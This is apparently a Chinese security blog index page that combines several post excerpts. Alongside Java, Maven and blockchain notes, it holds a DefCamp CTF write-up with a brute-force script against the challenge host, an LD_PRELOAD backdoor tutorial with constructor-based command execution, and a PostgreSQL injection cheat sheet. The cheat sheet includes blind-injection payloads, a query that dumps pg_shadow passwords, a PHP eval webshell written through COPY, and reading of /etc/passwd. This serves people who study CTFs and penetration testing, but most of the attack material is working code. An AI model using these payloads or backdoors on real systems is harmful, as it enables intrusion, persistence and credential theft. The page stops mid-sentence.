<h3 id="filter实现流程"><a href="#filter实现流程" class="headerlink" title="filter实现流程"></a>filter实现流程</h3><p>用户向服务器发送request请求，服务器接收改请求，并将请求按次序发送到filter中进行处理，最后调用servlet中的service()方法，调用完毕后，按照与进入时相反的顺序调用filter返回给服务器，最终返回给用户。</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2022/02/20/java%E5%88%9D%E6%8E%A2%EF%BC%88%E4%B8%80%EF%BC%89/">java初探（一）</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2022-02-20</time><div class="content"><h2 id="对java进行远程调试"><a href="#对java进行远程调试" class="headerlink" title="对java进行远程调试"></a>对java进行远程调试</h2><h3 id="对jar包进行远程调试"><a href="#对jar包进行远程调试" class="headerlink" title="对jar包进行远程调试"></a>对jar包进行远程调试</h3><p>1.创建一个java项目，并创建一个lib文件夹将jar包放入<br>2.进入lib文件夹后，右键选择 Add as Library<br>3.选择右上角的Add Configurations，并单击+号添加remote，其中</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-agentlib:jdwp&#x3D;transport&#x3D;dt_socket,server&#x3D;y,suspend&#x3D;n,address&#x3D;5005</span><br></pre></td></tr></table></figure>

<h3 id="对weblogic进行远程调试"><a href="#对weblogic进行远程调试" class="headerlink" title="对weblogic进行远程调试"></a>对weblogic进行远程调试</h3><h2 id="maven基础知识掌握"><a href="#maven基础知识掌握" class="headerlink" title="maven基础知识掌握"></a>maven基础知识掌握</h2><p>Maven是一个项目构建工具，采用Project Object Model概念来管理项目。</p>
<h3 id="1-pom-xml文件介绍"><a href="#1-pom-xml文件介绍" class="headerlink" title="1.pom.xml文件介绍"></a>1.pom.xml文件介绍</h3><p>该文件使用xml文件结构，用于管理源代码，配置文件，开发者的信息和角色，问题追踪系统，组织者信息，项目授权，项目的url，项目的依赖关系等。</p>
<p>maven项目中必须包含pom.xml文件。</p>
<h3 id="2-pom-xml定义依赖关系"><a href="#2-pom-xml定义依赖关系" class="headerlink" title="2.pom.xml定义依赖关系"></a>2.pom.xml定义依赖关系</h3><p>pom.xml文件中的dependencies和dependency用于定义依赖关系，</p>
<p>dependency通过groupId、artifactId、version来定义所依赖的项目。引入fastjson1.2.24版本组件的Maven配置信息</p>
<p>debugFlag=”true”<br>export debugFlag</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2022/02/13/%E5%8C%BA%E5%9D%97%E9%93%BE%E7%90%86%E8%AE%BA%E5%AD%A6%E4%B9%A0/">区块链理论学习</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2022-02-13</time><div class="content"><p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20220213162331.png" alt="../../../_images/IMG_5019.PNG"></p>
<h2 id="数据链和节点链"><a href="#数据链和节点链" class="headerlink" title="数据链和节点链"></a>数据链和节点链</h2><p>数据链指用链式结构组织区块数据，构成数据校验和追溯的链条；“节点链”指多个节点通过网络连接在一起，互相共享信息，其中的共识节点则联合执行共识算法，产生并确认区块。</p>
<p>针对溯源机制来说，生产商，运输商就相当于节点链，而需要上链的数据则是针对数据链而言，并且数据上链即为交易上链</p>
<p>交易“上链”的简要过程如下：</p>
<ol>
<li>记账者们收录交易，按链式数据结构打包成“区块”。</li>
<li>共识算法驱动大家验证新区块里的交易，确保计算出一致的结果。</li>
<li>数据被广播到所有节点，稳妥存储下来，每个节点都会存储一个完整的数据副本。</li>
</ol>
<h2 id="共识机制"><a href="#共识机制" class="headerlink" title="共识机制"></a>共识机制</h2><p>“共识机制”，是通过特殊节点的投票，在很短的时间内完成对交易的验证和确认；对一笔交易，如果利益不相干的若干个节点能够达成共识，我们就可以认为全网对此也能够达成共识。</p>
<h2 id="智能合约"><a href="#智能合约" class="headerlink" title="智能合约"></a>智能合约</h2><p>智能合约是一种特殊协议，旨在提供、验证及执行合约。具体来说，智能合约是区块链被称之为“去中心化的”重要原因，它允许我们在不需要第三方的情况下，执行可追溯、不可逆转和安全的交易。</p>
<p>智能合约是执行“如果发生这种情况就执行那种结果”的小程序，由大量计算机运行并验证以确保可信。</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2022/02/11/2022DefCamp-CTF/">2022DefCamp CTF</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2022-02-11</time><div class="content"><h2 id="web-intro"><a href="#web-intro" class="headerlink" title="web_intro"></a>web_intro</h2><p>爆破flask_session的cookie</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flask-unsign --unsign --cookie &quot;eyJsb2dnZWRfaW4iOmZhbHNlfQ.YgYrAQ.--h0ihPw9_7i2FNqzJ-u-Oythjk&quot;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20220211223715.png" alt="img"></p>
<p>爆破出密码以后，在加密</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flask-unsign --sign --cookie &quot;&#123;&#39;logged&#39;: True&#125;&quot; --secret &#39;password&#39;</span><br></pre></td></tr></table></figure>

<h2 id="para-code"><a href="#para-code" class="headerlink" title="para-code"></a>para-code</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if (strlen($_GET[&#39;start&#39;]) &lt; 5)&#123;</span><br><span class="line">  echo shell_exec($_GET[&#39;start&#39;]);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">  echo &quot;Please enter a valid command&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>四字符getshell</p>
<p>队里大师傅的解,收藏起来了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">m4 *</span><br></pre></td></tr></table></figure>

<p>后来师傅在群里说思路，确实有被震惊到，原来他是直接循环爆破两个字符，有回显的就可以了。。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">s=requests.session()</span><br><span class="line">url=<span class="string">&quot;http://34.159.7.96:32210/&quot;</span></span><br><span class="line">a=<span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyz&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> a:</span><br><span class="line">        payload=<span class="string">f&quot;?start=<span class="subst">&#123;i&#125;</span><span class="subst">&#123;j&#125;</span> *&quot;</span></span><br><span class="line">        r=s.get(url+payload).text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;$flag = &quot;</span> <span class="keyword">in</span> r:</span><br><span class="line">            print(payload)</span><br><span class="line">            print(r)</span><br></pre></td></tr></table></figure>

<p>确实是一个挺好的思路</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2022/02/10/%E4%BD%BF%E7%94%A8docker%E5%87%BA%E9%A2%98/">使用docker出题</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2022-02-10</time><div class="content"></div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2022/02/08/LD-PRELOAD%E5%AD%A6%E4%B9%A0/">LD_PRELOAD学习</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2022-02-08</time><div class="content"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>做题遇到这个东西，查了一下，原来是以前disable_functions的，但是没有深入研究过，现在看看。</p>
<h2 id="LD-PRELOAD"><a href="#LD-PRELOAD" class="headerlink" title="LD_PRELOAD"></a>LD_PRELOAD</h2><p>在学习LD_PRELOAD前需要了解一下什么是链接</p>
<h3 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h3><ul>
<li>静态链接：在程序运行之前先将各个目标模块以及所需要的库函数链接成一个完整的可执行程序，之后不再拆开。</li>
<li>装入时动态链接：源程序编译后所得到的一组目标模块，在装入内存时，边装入边链接。</li>
<li>运行时动态链接：原程序编译后得到的目标模块，在程序执行过程中需要用到时才对它进行链接。</li>
</ul>
<p>我们在加载动态链接的时候，需要使用一个动态链接库，其作用在于当动态库中的函数发生变化时，对于可执行程序来说是透明的，可执行程序无需重新编译，方便程序的发布/维护/更新。也就是说可执行程序虽然用得还是那些函数，但是可能函数的内容已经发生了变化，但是可执行程序将直接执行这个变化。但是如果这个动态加载的函数是恶意的（指的就是前面的变化），那么就会带来恶意的执行结果。</p>
<h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>1.LD_PRELOAD是linux系统中的一个<strong>环境变量</strong><br>2.它可以影响程序的运行时的链接，允许你定义 ：在程序运行前优先加载 的动态链接库。即可以有选择性的载入 不同动态链接库中的相同函数。</p>
<p>通过这个环境变量，我们可以在自定义加载动态链接库，甚至覆盖原本的正常函数库，以达到特定的目的。</p>
<h2 id="LD-PRELOAD-Hook"><a href="#LD-PRELOAD-Hook" class="headerlink" title="LD_PRELOAD Hook"></a>LD_PRELOAD Hook</h2><p>因为LD_PRELOAD可以指定在程序运行前的动态链接库，所我们可以重写程序运行过程中所调用的函数，并编译成动态链接库文件，然后通过修改LD_PRELOAD变量，让程序优先加载这个恶意动态链接库，最后当程序再次运行时便会加载动态链接库里的恶意函数。</p>
<p>具体步骤如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.定义与目标函数完全一样的函数，包括名称、变量、及类型返回值</span><br><span class="line">2.将包含替换函数的源码编译为动态链接库</span><br><span class="line">3.通过命令export LD_PRELOAD&#x3D;&#39;库文件路径&#39;，设置要优先替换的动态链接库</span><br><span class="line">4.替换结束，要还原函数调用关系，用命令unset LD_PRELOAD接触</span><br></pre></td></tr></table></figure>

<p>实例:</p>
<p>在验证密码的时候，一般是使用strcmp进行对比，</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">char</span> passwd[] = <span class="string">&quot;password&quot;</span>;</span><br><span class="line">	<span class="keyword">if</span> (argc &lt; <span class="number">2</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;usage: %s &lt;given-password&gt;\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (!<span class="built_in">strcmp</span>(passwd, argv[<span class="number">1</span>])) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;\033[0;32;32mPassword Correct!\n\033[m&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[0;32;31mPassword Wrong!\n\033[m&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>进行编译</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc passcheck.c -o passcheck</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20220209095538.png" alt="img" style="zoom:67%;">

<p>改写一下strcmp同名函数,实现劫持功能:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">strcmp</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *s1,<span class="keyword">const</span> <span class="keyword">char</span> *s2)</span></span></span><br><span class="line"><span class="function">    <span class="title">if</span> <span class="params">(getenv(<span class="string">&quot;LD_PRELOAD&quot;</span>)==<span class="literal">NULL</span>)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>此时我们通过LD_PRELOAD劫持了strcmp函数，并启动了一个新进程，为避免陷入劫持循环，必须得删除LD_PRELOAD</li>
</ul>
<p>执行命令编译生成ho*.so</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc -shared -fPIC hook_strcmp.c -o hook_strcmp.so</span><br></pre></td></tr></table></figure>

<p>然后通过设置环境变量，使得hook.strcmp.so能被调用它的程序优先加载</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> LD_PRELOAD=$PWD/hook_strcmp.so</span><br></pre></td></tr></table></figure>



<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20220209100213.png" alt="img"></p>
<p>此时结果都为correct，也即劫持了strcmp函数</p>
<p>其实也很好理解，此时strcmp已经丧失原本对比的功能了，此时的strcmp的内部构造为，无论如何都返回0，然后经过!的取反处理，则变成了1.所以都是password correct</p>
<p>要还原的话使用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">unset LD_PRELOAD</span><br></pre></td></tr></table></figure>

<p>否则所有有调用此函数的命令都无法正常使用</p>
<h2 id="LD-PRELOAD制作后门"><a href="#LD-PRELOAD制作后门" class="headerlink" title="LD_PRELOAD制作后门"></a>LD_PRELOAD制作后门</h2><p>根据上面的知识，我们可以知道，通过LD_PRELOAD可以动态替换一些已经定义好的函数，但是有几个问题，我们从头捋一下，我们要后门执行命令，就说明需要调用一个进程，然后再去定点修改这个进程所调用的函数。</p>
<p>看了一下，都有一下函数可以使用</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20220209104157.png" alt="img" style="zoom:67%;">

<p>先以ls为例,首先查看 <code>ls</code> 这一系统命令会调用哪些库函数：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">readelf -Ws &#x2F;usr&#x2F;bin&#x2F;ls</span><br></pre></td></tr></table></figure>

<p>选择函数进行重写，但是不知道为啥这里查看不到，可能是版本问题吧</p>
<p>直接进行改写</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">payload</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    system(<span class="string">&quot;id&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">strncmp</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *__s1, <span class="keyword">const</span> <span class="keyword">char</span> *__s2, <span class="keyword">size_t</span> __n)</span> </span>&#123;    <span class="comment">// 这里函数的定义可以根据报错信息进行确定</span></span><br><span class="line">    <span class="keyword">if</span> (getenv(<span class="string">&quot;LD_PRELOAD&quot;</span>) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">    payload();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>此时替换成功</p>
<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20220209115516.png" alt="img"></p>
<p>根据此思路 可以使用一些反弹shell的命令</p>
<h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><p>总结一下要使用LD_PRELOAD实现rce需要以下几点</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.具有设置环境变量的权限</span><br><span class="line">2.可以启动新进程</span><br><span class="line">3.能够上传文件（.so）</span><br></pre></td></tr></table></figure>

<p>但是要找到一个函数去替换是比较困难的，所以可以使用 C 语言扩展修饰符 <code>__attribute__((constructor))</code>，可以让由它修饰的函数在 <code>main()</code> 之前执行，若它出现在动态链接库中，那么一旦动态链接库被系统加载，将立即执行 <code>__attribute__((constructor))</code> 修饰的函数。这样，我们就不用局限于仅劫持某一函数，而应考虑劫持动态链接库了，也可以说是劫持了一个新进程。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) void preload (void)&#123;</span><br><span class="line">    unsetenv(&quot;LD_PRELOAD&quot;);</span><br><span class="line">    system(&quot;id&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>蚁剑插件脚本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#define _GNU_SOURCE</span><br><span class="line"></span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">extern char** environ;</span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) void preload (void)</span><br><span class="line">&#123;</span><br><span class="line">    &#x2F;&#x2F; get command line options and arg</span><br><span class="line">    const char* cmdline &#x3D; getenv(&quot;EVIL_CMDLINE&quot;);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; unset environment variable LD_PRELOAD.</span><br><span class="line">    &#x2F;&#x2F; unsetenv(&quot;LD_PRELOAD&quot;) no effect on some </span><br><span class="line">    &#x2F;&#x2F; distribution (e.g., centos), I need crafty trick.</span><br><span class="line">    int i;</span><br><span class="line">    for (i &#x3D; 0; environ[i]; ++i) &#123;</span><br><span class="line">            if (strstr(environ[i], &quot;LD_PRELOAD&quot;)) &#123;</span><br><span class="line">                    environ[i][0] &#x3D; &#39;\0&#39;;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; executive command</span><br><span class="line">    system(cmdline);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="一点思考"><a href="#一点思考" class="headerlink" title="一点思考"></a>一点思考</h2><p>其实要想利用这个环境变量，最关键的还是要找到能够自启动的进程。</p>
<p><a target="_blank" rel="noopener" href="https://whoamianony.top/2021/10/22/Web%E5%AE%89%E5%85%A8/%E6%9C%89%E8%B6%A3%E7%9A%84%20LD_PRELOAD/">https://whoamianony.top/2021/10/22/Web%E5%AE%89%E5%85%A8/%E6%9C%89%E8%B6%A3%E7%9A%84%20LD_PRELOAD/</a></p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2022/02/07/nodejs-express%E5%BC%80%E5%8F%91/">nodejs-express开发</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2022-02-07</time><div class="content"><p>1.全局安装express框架,cmd打开命令行,输入如下命令:</p>
<pre><code>    npm install -g express</code></pre>
<p>   express 4.x版本中将命令工具分出来,安装一个命令工具,执行命令:</p>
<pre><code>    npm install -g express-generator

 输入express --version验证</code></pre>
<p>2.如果在执行js文件仍报Error: Cannot find module express错误。</p>
<p>解决办法：<br>    在自己的工程目录下再次执行:<br>        npm  install express<br>————————————————<br>版权声明：本文为CSDN博主「mlsama」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/mlsama/article/details/80211033">https://blog.csdn.net/mlsama/article/details/80211033</a></p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2022/02/07/postgresql%E6%B3%A8%E5%85%A5/">postgresql注入</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2022-02-07</time><div class="content"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>总结一下一些注入姿势</p>
<h2 id="基础语法"><a href="#基础语法" class="headerlink" title="基础语法"></a>基础语法</h2><p>1.Postgres 都是大小写不敏感的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\h #查看所有的sql关键字</span><br><span class="line">\? #命令行操作的帮助</span><br><span class="line">\d #查看当前schema 中所有的表</span><br><span class="line">\q #退出pg命令行</span><br><span class="line">\d #schema.table 查看表的结构</span><br><span class="line">\x #横纵显示切换</span><br><span class="line">\dT+ #显示扩展类型相关属性及描述</span><br><span class="line">\l #列出所有的数据库</span><br><span class="line">\timing #显示执行时间</span><br><span class="line">\c database_name #切换数据库</span><br><span class="line">set search to schema #切换schema</span><br><span class="line">explain sql #解释或分析sql执行过程</span><br></pre></td></tr></table></figure>

<p>数据库之间的语言基本都是通用的，查询的时候重点关注的还是一些库的不同，例如current_database(),像like这些也是通用的s</p>
<h2 id="注入点测试以及注入方法"><a href="#注入点测试以及注入方法" class="headerlink" title="注入点测试以及注入方法"></a>注入点测试以及注入方法</h2><p>postgresql的注入点可能会位于不同字句内</p>
<h3 id="select"><a href="#select" class="headerlink" title="select"></a>select</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">如果参数是整数：</span><br><span class="line">pg_sleep(20); -- -</span><br><span class="line">如果参数是字符串：</span><br><span class="line">&#39;||pg_sleep(20); -- -</span><br></pre></td></tr></table></figure>

<p>注入方法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; UNION SELECT &#39;a&#39;;-- -&#39;</span><br></pre></td></tr></table></figure>

<h3 id="union"><a href="#union" class="headerlink" title="union"></a>union</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;||password FROM users; -- -&#39;;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20220207163523.png" alt="img"></p>
<p>我们知道一般回显的是第一列，所以只需要让第一列不存在就行了</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20220207163806.png" alt="img" style="zoom:67%;">

<h3 id="from"><a href="#from" class="headerlink" title="from"></a>from</h3><p>测试语句:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">数字:</span><br><span class="line">(SELECT * FROM [TABLE] WHERE [COLUMN]&#x3D;1|(SELECT (SELECT CASE WHEN COUNT((SELECT pg_sleep(20)))&lt;&gt;0 THEN 1 ELSE 2 END))) ss; -- -</span><br><span class="line">字符串：</span><br><span class="line">(SELECT * FROM [TABLE] WHERE [COLUMN] &#x3D; &#39;asd&#39;::varchar||(SELECT (SELECT CASE WHEN COUNT((SELECT pg_sleep(20)))&lt;&gt;0 THEN 1 ELSE 2 END))) ss; -- -</span><br></pre></td></tr></table></figure>

<p>注入语句为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(SELECT * FROM address WHERE address&#x3D;&#39;&#39;||(SELECT CASE WHEN (SELECT COUNT((SELECT username FROM staff WHERE username SIMILAR TO &#39;M%&#39;)))&lt;&gt;0 THEN pg_sleep(20) ELSE &#39;&#39; END)) ss; -- -;</span><br></pre></td></tr></table></figure>

<p>最终效果为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT address FROM (SELECT * FROM address WHERE address&#x3D;&#39;&#39;||(SELECT CASE WHEN (SELECT COUNT((SELECT username FROM staff WHERE username SIMILAR TO &#39;M%&#39;)))&lt;&gt;0 THEN pg_sleep(20) ELSE &#39;&#39; END)) ss; -- -;</span><br></pre></td></tr></table></figure>

<p>根据<code>SELECT username FROM staff WHERE username SIMILAR TO &#39;M%&#39;</code>返回的内容与否，它会休眠20秒，或者什么也不做。可以逐字节fuzz数据。</p>
<h3 id="order-by"><a href="#order-by" class="headerlink" title="order by"></a>order by</h3><p>注入点测试：是否延时</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(SELECT CASE WHEN COUNT((SELECT pg_sleep(20)))&lt;&gt;0 THEN true ELSE false END); -- -</span><br></pre></td></tr></table></figure>

<p>利用order by的true或者false</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(SELECT CASE WHEN COUNT((SELECT (SELECT CASE WHEN COUNT((SELECT username FROM staff WHERE username SIMILAR TO &#39;M%&#39;))&lt;&gt;0 THEN pg_sleep(20) ELSE &#39;&#39; END)))&lt;&gt;0 THEN true ELSE false END); -- -</span><br></pre></td></tr></table></figure>

<ol>
<li>如果第一个COUNT函数没有返回零，那么对于ORDER BY，我们得到最终的true或false。</li>
<li>正确或错误取决于内部选择(第二个查询是核心判断的)。</li>
<li>内部选择将休眠20秒，或者什么也不返回。</li>
<li>这取决于人员表中用户的首字母是否以M开头（这是<code>SELECT username FROM staff WHERE username SIMILAR TO &#39;M%&#39;</code>部分）。</li>
</ol>
<h3 id="HAVING"><a href="#HAVING" class="headerlink" title="HAVING"></a>HAVING</h3><p>注入点测试</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">如果parameter是整数：</span><br><span class="line">(COUNT((SELECT pg_sleep(20)))&#x3D;1); -- -</span><br><span class="line"></span><br><span class="line">如果parameter是字符串：</span><br><span class="line">t&#39; AND (SELECT COUNT((SELECT pg_sleep(20)))) &#x3D; 1; -- -</span><br></pre></td></tr></table></figure>

<p>此参数接受一个条件，因此我添加了一个<code>AND</code>运算符以使之必须都为真，然后添加了条件，该条件将使我们可以逐字节对值进行暴力破解。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">t&#39; AND (SELECT COUNT((SELECT password FROM staff WHERE password SIMILAR TO &#39;8%&#39; LIMIT 1))) &#x3D; 1; -- -</span><br></pre></td></tr></table></figure>

<p>同样，如果未显示输出，则可以使pg_sleep（）函数的大部分时间睡眠（如果为true）20秒钟，并使用它来确定条件输出。</p>
<h2 id="内置函数"><a href="#内置函数" class="headerlink" title="内置函数"></a>内置函数</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">current_database() &#x2F;&#x2F;当前数据库名</span><br><span class="line">session_user   &#x2F;&#x2F;会话用户</span><br><span class="line">current_user   &#x2F;&#x2F;当前数据库用户</span><br><span class="line">user           &#x2F;&#x2F;当前用户</span><br><span class="line">version()      &#x2F;&#x2F;数据库版本</span><br></pre></td></tr></table></figure>

<h2 id="注入过程"><a href="#注入过程" class="headerlink" title="注入过程"></a>注入过程</h2><p>爆库</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">and 1&#x3D;2 union select (select current_database()),null,null--</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20220207165156.png" alt="img"></p>
<p>获取表名，字段名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">and 1&#x3D;2 union select table_name,null,null from information_schema.tables limit 1 offset n--</span><br><span class="line">and 1&#x3D;2 union select column_name,null,null from information_schema.columns where table_name&#x3D;&#39;admin&#39; limit 1 offset n--</span><br><span class="line">(老版本)</span><br><span class="line">pg_class.oid对应pg_attribute.attrelid</span><br><span class="line">pg_class.relname表名</span><br><span class="line">pg_attribute.attname字段名</span><br><span class="line">select relname from pg_class获取表名</span><br><span class="line">select oid from pg_class wehre relname&#x3D;&#39;admin&#39;获取表的oid</span><br><span class="line">select attname from pg_attribute where attrelid&#x3D;&#39;oid的值&#39;  获取字段名</span><br></pre></td></tr></table></figure>

<p>获取数据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nd 1&#x3D;2 union select username||chr(124)||passwd,null,null from pg_shadow limit 1 offset 0--爆数据库用户密码</span><br></pre></td></tr></table></figure>

<h2 id="读写文件"><a href="#读写文件" class="headerlink" title="读写文件"></a>读写文件</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">老版本写文件:</span><br><span class="line">create table beach(shell text)</span><br><span class="line">insert into beach values(&#39;&lt;?php eval($_POST[c])?&gt;&#39;)</span><br><span class="line">copy beach(shell) to &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;shell.php&#39;</span><br><span class="line">drop table beach</span><br><span class="line"></span><br><span class="line">#PS:copy (select &#39;&lt;?php eval($_POST[c])?&gt;&#39;) to &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;shell.php&#39;</span><br><span class="line"></span><br><span class="line">老版本读文件:</span><br><span class="line">create table beach(shell text)</span><br><span class="line">copy beach(shell) from &#39;&#x2F;etc&#x2F;passwd&#39;</span><br><span class="line">select * from beach limit 1 offset n读每一行</span><br><span class="line"></span><br><span class="line">实战:</span><br><span class="line">登入后:</span><br><span class="line">sql&gt;select &#39;&lt;%execute request(&quot;v&quot;)%&gt;&#39;;</span><br><span class="line">sql&gt;\o c:\\wwwroot\\1.asp</span><br><span class="line">URL执行:</span><br><span class="line">id&#x3D;1;copy (select &#39;&lt;?php eval($_POST[c])?&gt;&#39;) to &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;shell.php&#39;</span><br><span class="line"></span><br><span class="line">新版本:</span><br><span class="line">pg_file_write(filename,text,bool)</span><br><span class="line">pg_read_file(filename,pos,length)</span><br><span class="line">pg_ls_dir(dirname)</span><br><span class="line"></span><br><span class="line">绕过转义: GPC&#x3D;On时候 